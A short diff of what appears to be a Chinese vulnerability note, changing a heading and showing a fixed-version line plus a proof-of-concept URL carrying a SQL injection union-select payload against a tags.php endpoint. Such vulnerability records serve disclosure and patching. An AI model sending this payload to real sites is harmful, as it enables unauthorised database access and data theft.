@@ -7,7 +7,7 @@
 v5.7.111，或打补丁的历史版本
 ```
 
-## poc
+## POC
 ```
 http://x.com/tags.php?tag=a/alias/about%27and{`\%27`%20id}%3E0.1union%20select%201,2,3,4,5,6,7,8,9,10,11--%20\\
 
